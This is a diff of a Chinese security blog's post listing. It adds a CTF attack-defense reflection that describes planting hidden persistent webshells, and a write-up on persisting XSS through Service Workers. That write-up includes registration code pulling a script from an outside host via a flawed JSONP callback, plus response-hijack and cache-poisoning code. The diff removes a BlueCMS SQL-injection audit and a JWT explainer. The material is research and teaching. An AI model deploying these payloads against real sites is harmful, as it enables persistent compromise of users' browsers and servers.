@@ -90,6 +90,206 @@
     
         <article class="post">
             <h1>
+                <a class="title" href="/2018/12/17/HCTF2018线下赛感想/"> 
+                    HCTF2018线下赛感想 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-12-17   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/博客文章/">博客文章</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <p>跑去丢了一趟人，实在是对不起各位师傅</p>
+<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><p>比赛期恰逢考试期，几天一共就睡了几个小时，无论从体力或是经验都输的一塌糊涂。</p>
+<p>这次比赛也算是给自己个教训，<strong>准备不充分</strong>，就把之前备好的流量成功监控了，其余的东西几乎没用</p>
+<p>比赛开始配置网络用了挺长时间的，导致登上ssh以后就已经被别人上马了。</p>
+<p>其实这是很吃亏的事：第一，你无法及时备份原始的目录，这就有一个很严重的后果，如果后来一不小心恢复了留有马子的备份一切功亏一篑，更严重的是，如果你的一些服务被恶意删了，那开局就直接崩盘。</p>
+<p>第二，在你杀别人后门的时候，别人可能就已经打了你一轮，甚至可能会种新的马。而且杀后门的时间又占用了补洞的时间..新一轮的马子又会上来…</p>
+<p>所以上线一定要快，备份打的一定要快！</p>
+<p>教训就是，一定要在本地补好洞了，再传到机器上，宁可被打，也要修好自己的服务，被打总比down掉了好。这次吃了很大的亏，全场被check。</p>
+<p>所以，不要随便就删漏洞点，有时候漏洞点也是功能点。补洞不代表无脑卡权限，这次include的文件包含洞就可以换成file_get_contents来补。<strong>最重要的事，不要随便就把目录555了</strong>，如果Check点是上传和下载功能就凉了</p>
+<p>关于防御，<strong>一定要给自己留一个可用的后门</strong>,www-data权限一定得有一个，否则php进程可能都杀不掉</p>
+<h1 id="这次比赛后要准备的东西"><a href="#这次比赛后要准备的东西" class="headerlink" title="这次比赛后要准备的东西"></a>这次比赛后要准备的东西</h1><p>吃足了教训：<strong>手动上马是非常愚蠢的行为</strong></p>
+<h2 id="内置后门批量上马"><a href="#内置后门批量上马" class="headerlink" title="内置后门批量上马"></a>内置后门批量上马</h2><p>蓝莲花的moxiaoxi师傅的脚本思路大致是这样的：</p>
+<p>内置后门(能执行system函数)，通过散列生成随机名字的隐藏不死马+守护进程维护不死马+软连接来隐藏真实的请求</p>
+<p>最近要完成这个脚本</p>
+<h2 id="心态"><a href="#心态" class="headerlink" title="心态"></a>心态</h2><p>心态真的是很重要，不要因为被打就慌张，找到洞点，补好了再上服务，切忌慌里慌张。</p>
+<p>这次就算是交学费了，自闭</p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2018/12/17/HCTF2018线下赛感想/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
+                <a class="title" href="/2018/11/14/RootkitXSS֮ServiceWorker/"> 
+                    RootkitXSS之ServiceWorker 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-11-14   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS测试/">XSS测试</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="RootkitXSS之ServiceWorker"><a href="#RootkitXSS之ServiceWorker" class="headerlink" title="RootkitXSS之ServiceWorker"></a>RootkitXSS之ServiceWorker</h1><p>文章首发于先知：<a href="https://xz.aliyun.com/t/3228#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/3228#toc-10</a></p>
+<p>在拿到一个可以XSS点的时候后，持久化成为一种问题。这几天跟师傅们接触到RootkiXss的一些姿势，受益匪浅</p>
+<h2 id="Serviceworker定义"><a href="#Serviceworker定义" class="headerlink" title="Serviceworker定义"></a>Serviceworker定义</h2><p>Service workers(后文称SW) 本质上充当Web应用程序与浏览器之间的代理服务器，也可以在网络可用时作为浏览器和网络间的代理。它们旨在（除其他之外）使得能够创建有效的离线体验，拦截网络请求并基于网络是否可用以及更新的资源是否驻留在服务器上来采取适当的动作。他们还允许访问推送通知和后台同步API。</p>
+<p>也就是说SW 提供了一组API，能够拦截当前站点产生HTTP请求，还能控制返回结果。因此，SW 拦住请求后，使用 Cache Storage 里的内容进行返回，就可以实现离线缓存的功能。当Cache Storage不存在请求的资源时再向服务器请求,cache.put可以选择性地将请求资源加载到cache storage中。如果不手动取消已经注册过的sw服务,刷新/重新打开页面都会启动站点的sw服务，这为我们持久化XSS提供了一定的条件。</p>
+<h3 id="查看SW服务"><a href="#查看SW服务" class="headerlink" title="查看SW服务"></a>查看SW服务</h3><p>Chrome地址栏访问 chrome://serviceworker-internals/，就可以看见已有的后台服务。</p>
+<h2 id="注册serviceworker"><a href="#注册serviceworker" class="headerlink" title="注册serviceworker"></a>注册serviceworker</h2><p>注册点js代码</p>
+<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
+    var url=&quot;//localhost/serviceworker.js&quot;;
+    if (&#39;serviceWorker&#39; in navigator) {
+ navigator.serviceWorker.register(url)
+ .then(function(registration) {
+ console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope);
+ })
+};
+&lt;/script&gt;
+normal visit</code></pre><p>script标签下的type必须指明为<code>text/javascript</code></p>
+<h3 id="event-request-clone"><a href="#event-request-clone" class="headerlink" title="event.request.clone()"></a>event.request.clone()</h3><p>对象的内容如图<br><img src="https://i.loli.net/2018/11/03/5bdd0e7b665f4.png" alt></p>
+<h2 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h2><h3 id="一个可以XSS的点"><a href="#一个可以XSS的点" class="headerlink" title="一个可以XSS的点"></a>一个可以XSS的点</h3><h3 id="sw文件可控"><a href="#sw文件可控" class="headerlink" title="sw文件可控"></a>sw文件可控</h3><p>如果说sw可以放在同源下,也就是js文件可控的话。直接注册Sw，代码如下：</p>
+<pre><code>// 拦截特定的Url，如果请求是对应的Url，则返回攻击的response
+self.addEventListener(&#39;fetch&#39;, function (event) {  
+    var url = event.request.clone(); 
+    body = &#39;&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt;&#39;;
+    init = {headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }};
+    if(url.url==&#39;http://localhost/reurl.html&#39;){
+        res  = new Response(body,init);
+        event.respondWith(res.clone());
+    }
+});</code></pre><h3 id="jsonp回调接口"><a href="#jsonp回调接口" class="headerlink" title="jsonp回调接口"></a>jsonp回调接口</h3><p>利用储值型X点写入下面的代码</p>
+<p>当JSONP接口存在缺陷时，比如没有校验回调名。导致返回内容可控<br>比如：url?callback=importScript(…)<br>返回<code>importScript(...)</code><br>代码实现如下：</p>
+<pre><code>&lt;?php
+// JSONP 回调名缺少校验
+$cb_name = $_GET[&#39;callback&#39;];
+$cb_data = time();
+
+header(&#39;Content-Type: application/javascript&#39;);
+echo(&quot;$cb_name($cb_data)&quot;);</code></pre><p>attack_js</p>
+<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
+    var url=&quot;//localhost/getdata?callback=importScripts(&#39;//third.com/sw.js?g&#39;)&quot;;
+    if (&#39;serviceWorker&#39; in navigator) {
+ navigator.serviceWorker.register(url)
+ .then(function(registration) {
+ console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope);
+ })
+};
+&lt;/script&gt;</code></pre><p>这里面callback回调的事件就相当于sw脚本。当js被执行之后会注册一个sw脚本,内容是回调的事件<br><img src="https://i.loli.net/2018/11/05/5be04f7b70f25.png" alt><br><img src="https://i.loli.net/2018/11/05/5be04f9d988ca.png" alt></p>
+<p>或者鸡肋上传一个html到网站下</p>
+<pre><code>&lt;html&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot; /&gt; 
+&lt;body&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+    var url=&quot;//localhost/getdata?callback=importScripts(&#39;//third.com/sw.js?g&#39;)&quot;;
+    if (&#39;serviceWorker&#39; in navigator) {
+ navigator.serviceWorker.register(url)
+ .then(function(registration) {
+ console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope);
+ })
+};
+&lt;/script&gt;
+it&#39;s nothing
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><h2 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h2><ul>
+<li>存在有缺陷的 JSONP 接口</li>
+<li>JSONP 的目录尽可能浅（最好在根目录下），如果放在域的根目录下，将会收到这个域下的所有fetch事件</li>
+<li>JSONP 返回的 Content-Type 必须是 JS 类型</li>
+<li>存在 XSS 的页面</li>
+</ul>
+<p>在网上看到一个师傅这样作例,引用一下：<br>service worker文件被放在这个域的根目录下，这意味着service worker和网站同源。换句话说，这个service work将会收到这个域下的所有fetch事件。如果我将service worker文件注册为/example/sw.js，那么，service worker只能收到/example/路径下的fetch事件（例如： /example/page1/, /example/page2/）</p>
+<h2 id="Cache缓存污染"><a href="#Cache缓存污染" class="headerlink" title="Cache缓存污染"></a>Cache缓存污染</h2><p>前文的攻击不涉及cache里的资源,进行的是协商缓存，下面说一下强缓存的利用。</p>
+<h2 id="请求资源"><a href="#请求资源" class="headerlink" title="请求资源"></a>请求资源</h2><p>如果使用cache.put方法，则请求的资源成功后会存在Cache Storage里。如果fetch里写了caches.match(event.request)方法，则每次请求时会先从caches找缓存来优先返回给请求页面。若没有缓存，再进行新的缓存操作。</p>
+<p>下面是一个缓存读取/判断的demo</p>
+<pre><code>// 拦截特定的Url，如果请求是对应的Url，则返回攻击的response。否则用Fetch请求网络上原本的url，进行本地缓存(为了不影响正常功能))
+self.addEventListener(&#39;fetch&#39;, function (event) {  
+        event.respondWith(
+            //console.log(event.request)
+        caches.match(event.request).then(function(res){
+        if(res){//如果有缓存则使用缓存
+        return res;
+        }
+        return requestBackend(event);//没缓存就进行缓存
+        })
+        )
+   });
+
+function requestBackend(event){  
+        var url = event.request.clone();  
+        console.log(url)  //打印内容是打印到请求页面
+        if(url.url==&#39;http://localhost/reurl.html&#39;){//判断是否为需要劫持的资源
+
+        return new Response(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;, {headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }})
+        }
+        return fetch(url).then(function(res){
+        //检测是否为有效响应
+        if(!res || res.status !== 200 || res.type !== &#39;basic&#39;){
+        return res;
+        }
+        var response = res.clone();
+        caches.open(&#39;v1&#39;).then(function(cache){  //打开v1缓存进行存储
+        cache.put(event.request, response);
+        });
+
+        return res;
+        })
+}</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>前几天看ED师傅的研究,发现这种好玩但是鸡肋的方法。上面提到cache.put的方法把js资源添加到Cache Storage，其实如果我们用cache.put把恶意代码插入,覆盖原始的js数据。后果就是当sw请求cahce里的资源时会执行恶意代码。比如workbox会先从缓存读取静态资源,我们用异步请求将恶意代码无限覆盖这个缓存时：</p>
+<p>控制台输入下面的恶意代码</p>
+<pre><code>async function replay() {
+    const name = &#39;xx&#39;
+    const url = &#39;xx&#39;
+    const payload = `
+alert(1);
+`
+    let cache = await caches.open(name);
+    let req = new Request(url);
+    let res = new Response(payload + replay + &#39;;replay()&#39;);   //执行alert+写入cache内容+执行fn
+    setInterval(_ =&gt; {
+      cache.put(req, res.clone());
+    }, 500);
+}
+replay();</code></pre><p>就可以在cache Storage里看到500ms刷新并覆盖一次的js资源。<br><img src="https://i.loli.net/2018/11/05/5be0502e0dd09.png" alt></p>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>Service Worker API(<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API</a>)</p>
+<p>浏览器缓存知识(<a href="https://www.cnblogs.com/lyzg/p/5125934.html" target="_blank" rel="noopener">https://www.cnblogs.com/lyzg/p/5125934.html</a>)</p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2018/11/14/RootkitXSS֮ServiceWorker/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2018/11/13/HCTF题解/"> 
                     HCTF2018线上赛部分WriteUp 
                 </a>
@@ -1029,269 +1229,6 @@ if __name__ == &#39;__main__&#39;:
             </div>
             <div class="continue">
             <a href="/2018/08/21/Dedecms V5.7 SP2代码审计/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2018/08/18/代码审计复现：Bluecms 1.6/"> 
-                    代码审计复现：Bluecms 1.6 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-08-18   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近一阵子得了一场病，加之情感上的一件事，痛不欲生。陆陆续续的缓过来了，渡劫余生，留下该留下的。病也慢慢在恢复了。</p>
-<p>前些日子说要学代码审计，买了本《代码审计》看了两天，为作者尹毅先生无限打call，人生导师一样的人物，经历是传奇的，努力是可见的。书中开篇点题为什么要代码审计？这是web狗的一项技能。其实，当初学安全的时候我一直想要走的方向是渗透，虽然至今也是。但是渗透就仅仅是用工具来attack么？不，渗透是一种思路，是一种积累，也是一种艺术。它是我们基础的升华，经验的绽放。脚本小子use tools will nerver be a hacker。我们要学的、做的要很多，知识面要很宽，尽管路会很难。</p>
-<p>从今天起，至未来的一个月，会把学习的全部精力都投入到审计方向，立下flag:未来半个月内拿自己的cve</p>
-<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>cms: bulecms 1.6 sp1<br>php: 5.4 + mysql 5.5.53</p>
-<h2 id="sql注入一"><a href="#sql注入一" class="headerlink" title="sql注入一"></a>sql注入一</h2><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>问题文件位于：/uploads/ad_js.php</p>
-<pre><code>$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&#39;ad&#39;).&quot; WHERE ad_id =&quot;.$ad_id);</code></pre><p>变量未用单引号闭合，可能会引起注入</p>
-<p>跟踪一下$ad_id，查找该参数如何获得</p>
-<pre><code>$ad_id = !empty($_GET[&#39;ad_id&#39;]) ? trim($_GET[&#39;ad_id&#39;]) : &#39;&#39;;</code></pre><p>trim去掉ad_id两侧空格，未过滤参数，可注入</p>
-<p>再追踪一下getone()函数怎么定义的，一个定义mysql相关操作的文件位于/uploads/include/mysql.class.php：</p>
-<pre><code>    function getone($sql, $type=MYSQL_ASSOC){
-        $query = $this-&gt;query($sql,$this-&gt;linkid);
-        $row = mysql_fetch_array($query, $type);
-        return $row;
-    }</code></pre><p>追踪此类里query函数的定义：</p>
-<pre><code>    function query($sql){
-        if(!$query=@mysql_query($sql, $this-&gt;linkid)){
-            $this-&gt;dbshow(&quot;Query error:$sql&quot;);
-        }else{
-            return $query;
-        }
-    }</code></pre><p>查询出错则dbshow进行报错，有结果则返回$query集合后，$row进行取值</p>
-<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p><img src="https://s1.ax1x.com/2018/08/16/PWEujK.jpg" alt></p>
-<h2 id="sql注入二"><a href="#sql注入二" class="headerlink" title="sql注入二"></a>sql注入二</h2><p>一开始审了一个前台/uploads/user.php的宽字节注入,记一下思路：</p>
-<p>在mysql.class.php中看到：</p>
-<pre><code>mysql_query( &quot;SET NAMES gbk&quot;);</code></pre><p>看一下有没有进行addslashes过滤<br><img src="https://s1.ax1x.com/2018/08/16/PWEMnO.png" alt></p>
-<p>果然对POST\GET过滤，追踪deep_addslashes</p>
-<pre><code>function deep_addslashes($str)
-{
-    if(is_array($str))
-    {
-        foreach($str as $key=&gt;$val)
-        {
-            $str[$key] = deep_addslashes($val);
-        }
-    }
-    else
-    {
-        $str = addslashes($str);
-    }
-    return $str;
-}</code></pre><p>联想宽字节，先追踪一下处理表单的方法</p>
-<pre><code> elseif($act == &#39;index_login&#39;){
-     $user_name = !empty($_REQUEST[&#39;user_name&#39;]) ? trim($_REQUEST[&#39;user_name&#39;]) : &#39;&#39;;
-     $pwd = !empty($_REQUEST[&#39;pwd&#39;]) ? trim($_REQUEST[&#39;pwd&#39;]) : &#39;&#39;;
-     $remember = isset($_REQUEST[&#39;remember&#39;]) ? intval($_REQUEST[&#39;remember&#39;]) : 0;
-     if($user_name == &#39;&#39;){
-         showmsg(&#39;�û�������Ϊ��&#39;);
-     }
-     if($pwd == &#39;&#39;){
-         showmsg(&#39;���벻��Ϊ��&#39;);
-     }
-    $row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&#39;admin&#39;).&quot; WHERE admin_name=&#39;$user_name&#39;&quot;);
-    if($row[&#39;num&#39;] == 1){
-        showmsg(&#39;ϵͳ�û��鲻�ܴ�ǰ̨��¼&#39;);
-    }
-    $w = login($user_name, $pwd);
-
-    if(defined(&#39;UC_API&#39;) &amp;&amp; @include_once(BLUE_ROOT.&#39;uc_client/client.php&#39;)){
-        list($uid, $username, $password, $email) = uc_user_login($user_name, $pwd);
-        if($uid&gt;0){
-            $password = md5($password);
-            if(!$w){
-                $db-&gt;query(&quot;INSERT INTO &quot;.table(&#39;user&#39;).&quot; (user_name, pwd, email, reg_time) VALUES (&#39;$username&#39;, &#39;$password&#39;, &#39;$email&#39;, &#39;$timestamp&#39;)&quot;); 
-                $w = 1;
-            }
-            $ucsynlogin = uc_user_synlogin($uid);
-        }
-        elseif($uid === -1){
-            if($w == 1){
-                $user_info = $db-&gt;getone(&quot;SELECT email FROM &quot;.table(&#39;user&#39;).&quot; WHERE user_name=&#39;$user_name&#39;&quot;);
-                $uid = uc_user_register($user_name, $pwd, $user_info[&#39;email&#39;]);
-                if($uid &gt; 0) $ucsynlogin = uc_user_synlogin($uid);
-            }else $w = -1;
-        }
-        elseif($uid == -2){
-            showmsg(&#39;�������&#39;);
-        }
-        echo $ucsynlogin;
-    }
-    if($w == -1 || $w == 0){
-        showmsg(&#39;��������û��������벻��ȷ&#39;);
-    }
-    elseif($w == 1){
-        update_user_info($user_name);
-         if($remember==1){
-             setcookie(&#39;BLUE[user_id]&#39;, $_SESSION[&#39;user_id&#39;], time()+172800, $cookiepath, $cookiedomain);
-             setcookie(&#39;BLUE[user_name]&#39;, $user_name, time()+172800, $cookiepath, $cookiedomain);
-            setcookie(&#39;BLUE[user_pwd]&#39;, md5(md5($pwd).$_CFG[&#39;cookie_hash&#39;]), time()+172800, $cookiepath, $cookiedomain);
-         }
-         showmsg(&#39;��ӭ�� &#39;.$user_name.&#39; ���������ڽ�ת����Ա����&#39;, &#39;user.php&#39;);
-     }
- }</code></pre><p>追踪user_name怎么传入：</p>
-<pre><code>$user_name = !empty($_REQUEST[&#39;user_name&#39;]) ? trim($_REQUEST[&#39;user_name&#39;]) : &#39;&#39;;</code></pre><p>发现无过滤</p>
-<p>再追踪一下对suername的sql语句如何执行：</p>
-<pre><code>$row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&#39;admin&#39;).&quot; WHERE admin_name=&#39;$user_name&#39;&quot;);</code></pre><p>看到调用了getone()函数，第一个注入有介绍。</p>
-<p>再看到下面一句：</p>
-<pre><code>    if($row[&#39;num&#39;] == 1){
-        showmsg(&#39;ϵͳ�û��鲻�ܴ�ǰ̨��¼&#39;);
-    }</code></pre><p>在admin的表中查询admin_name表中是否有传入的user_name，若存在，$row[‘num’]值为1，然后执行showmsg函数，输出：“前台无法登陆”后返回主页。值为0进行以下操作：</p>
-<pre><code>$w = login($user_name, $pwd);</code></pre><p>再追踪login函数得到：</p>
-<pre><code> function login($user_name,$pwd){
-     global $db;
-    $row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&#39;user&#39;).&quot; WHERE user_name=&#39;$user_name&#39;&quot;);
-    if($row[&#39;num&#39;]==0){
-        $result = 0;
-    }else{
-        $sql = &quot;SELECT COUNT(*) AS num FROM &quot;.table(&#39;user&#39;).&quot; WHERE user_name=&#39;$user_name&#39; and pwd=md5(&#39;$pwd&#39;)&quot;;
-         $user_num = $db-&gt;getone($sql);
-         if($user_num[&#39;num&#39;]){
-             $result = 1;
-         }else $result = -1;
-    }
-     return $result;
- }</code></pre><p>到这里我们可以理解，这个页面的登陆逻辑是这样的：</p>
-<p><strong>如果我们的用户名是admin表中用户名，则不允许登陆</strong><br><strong>若不是表中的用户名，则会进行user表的对比查询，再判断是否有这个用户</strong></p>
-<p>明确思路：盲注<br>注入是否成功的判断条件：$row[‘num’]返回值</p>
-<h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>success injection: <img src="https://s1.ax1x.com/2018/08/17/PWKfzj.jpg" alt></p>
-<p>default injection: <img src="https://s1.ax1x.com/2018/08/17/PWKILq.png" alt></p>
-<p>google一下发现别人挖过后台登陆验证的宽字节，能够利用…<br><img src="https://blog.0kami.cn/img/bluecms_code_review/bluecms_login_success.png" alt></p>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>p师傅的浅析白盒审计中的字符编码及SQL注入：<a href="http://www.freebuf.com/articles/web/31537.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/31537.html</a></p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/08/18/代码审计复现：Bluecms 1.6/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2018/08/12/（转载） 基于 Token 的身份验证/"> 
-                    (转载)基于 Token 的身份验证 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-08-12   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/基础知识/">基础知识</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h2 id="传统身份验证的方法"><a href="#传统身份验证的方法" class="headerlink" title="传统身份验证的方法"></a>传统身份验证的方法</h2><p>HTTP 是一种没有状态的协议，也就是它并不知道是谁是访问应用。这里我们把用户看成是客户端，客户端使用用户名还有密码通过了身份验证，不过下回这个客户端再发送请求时候，还得再验证一下。</p>
-<p>解决的方法就是，当用户请求登录的时候，如果没有问题，我们在服务端生成一条记录，这个记录里可以说明一下登录的用户是谁，然后把这条记录的 ID 号发送给客户端，客户端收到以后把这个 ID 号存储在 Cookie 里，下次这个用户再向服务端发送请求的时候，可以带着这个 Cookie ，这样服务端会验证一个这个 Cookie 里的信息，看看能不能在服务端这里找到对应的记录，如果可以，说明用户已经通过了身份验证，就把用户请求的数据返回给客户端。</p>
-<p>上面说的就是 Session，我们需要在服务端存储为登录的用户生成的 Session ，这些 Session 可能会存储在内存，磁盘，或者数据库里。我们可能需要在服务端定期的去清理过期的 Session 。</p>
-<h2 id="基于-Token-的身份验证方法"><a href="#基于-Token-的身份验证方法" class="headerlink" title="基于 Token 的身份验证方法"></a>基于 Token 的身份验证方法</h2><p>使用基于 Token 的身份验证方法，在服务端不需要存储用户的登录记录。大概的流程是这样的：</p>
-<ul>
-<li><p>客户端使用用户名跟密码请求登录</p>
-</li>
-<li><p>服务端收到请求，去验证用户名与密码</p>
-</li>
-<li><p>验证成功后，服务端会签发一个 Token，再把这个 Token 发送给客户端</p>
-</li>
-<li><p>客户端收到 Token 以后可以把它存储起来，比如放在 Cookie 里或者 Local Storage 里</p>
-</li>
-<li><p>客户端每次向服务端请求资源的时候需要带着服务端签发的 Token</p>
-</li>
-<li><p>服务端收到请求，然后去验证客户端请求里面带着的 Token，如果验证成功，就向客户端返回请求的数据</p>
-</li>
-</ul>
-<h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>实施 Token 验证的方法挺多的，还有一些标准方法，比如 JWT，读作：jot ，表示：JSON Web Tokens 。JWT 标准的 Token 有三个部分：</p>
-<ul>
-<li><p>header</p>
-</li>
-<li><p>payload</p>
-</li>
-<li><p>signature</p>
-</li>
-</ul>
-<p>中间用点分隔开，并且都会使用 Base64 编码，所以真正的 Token 看起来像这样：</p>
-<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJuaW5naGFvLm5ldCIsImV4cCI6IjE0Mzg5NTU0NDUiLCJuYW1lIjoid2FuZ2hhbyIsImFkbWluIjp0cnVlfQ.SwyHTEx_RQppr97g4J5lKXtabJecpejuef8AqKYMAJc</p>
-<h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>header 部分主要是两部分内容，一个是 Token 的类型，另一个是使用的算法，比如下面类型就是 JWT，使用的算法是 HS256。</p>
-<p>{</p>
-<p>  “typ”: “JWT”,</p>
-<p>  “alg”: “HS256”</p>
-<p>}</p>
-<p>上面的内容要用 Base64 的形式编码一下，所以就变成这样：</p>
-<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</p>
-<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>Payload 里面是 Token 的具体内容，这些内容里面有一些是标准字段，你也可以添加其它需要的内容。下面是标准字段：</p>
-<ul>
-<li><p>iss：Issuer，发行者</p>
-</li>
-<li><p>sub：Subject，主题</p>
-</li>
-<li><p>aud：Audience，观众</p>
-</li>
-<li><p>exp：Expiration time，过期时间</p>
-</li>
-<li><p>nbf：Not before</p>
-</li>
-<li><p>iat：Issued at，发行时间</p>
-</li>
-<li><p>jti：JWT ID</p>
-</li>
-</ul>
-<p>比如下面这个 Payload ，用到了 iss 发行人，还有 exp 过期时间。另外还有两个自定义的字段，一个是 name ，还有一个是 admin 。</p>
-<p>{</p>
-<p> “iss”: “ninghao.net”,</p>
-<p> “exp”: “1438955445”,</p>
-<p> “name”: “wanghao”,</p>
-<p> “admin”: true</p>
-<p>}</p>
-<p>使用 Base64 编码以后就变成了这个样子：</p>
-<p>eyJpc3MiOiJuaW5naGFvLm5ldCIsImV4cCI6IjE0Mzg5NTU0NDUiLCJuYW1lIjoid2FuZ2hhbyIsImFkbWluIjp0cnVlfQ</p>
-<h3 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h3><p>JWT 的最后一部分是 Signature ，这部分内容有三个部分，先是用 Base64 编码的 header.payload ，再用加密算法加密一下，加密的时候要放进去一个 Secret ，这个相当于是一个密码，这个密码秘密地存储在服务端。</p>
-<ul>
-<li><p>header</p>
-</li>
-<li><p>payload</p>
-</li>
-<li><p>secret</p>
-</li>
-</ul>
-<p>var encodedString = base64UrlEncode(header) + “.” + base64UrlEncode(payload);</p>
-<p>HMACSHA256(encodedString, ‘secret’);</p>
-<p>处理完成以后看起来像这样：</p>
-<p>SwyHTEx_RQppr97g4J5lKXtabJecpejuef8AqKYMAJc</p>
-<p>最后这个在服务端生成并且要发送给客户端的 Token 看起来像这样：</p>
-<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJuaW5naGFvLm5ldCIsImV4cCI6IjE0Mzg5NTU0NDUiLCJuYW1lIjoid2FuZ2hhbyIsImFkbWluIjp0cnVlfQ.SwyHTEx_RQppr97g4J5lKXtabJecpejuef8AqKYMAJc</p>
-<p>客户端收到这个 Token 以后把它存储下来，下回向服务端发送请求的时候就带着这个 Token 。服务端收到这个 Token ，然后进行验证，通过以后就会返回给客户端想要的资源。</p>
-<h2 id="转载"><a href="#转载" class="headerlink" title="转载"></a>转载</h2><p>本文转载自<a href="https://ninghao.net/blog/2834" target="_blank" rel="noopener">https://ninghao.net/blog/2834</a></p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/08/12/（转载） 基于 Token 的身份验证/">
             Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
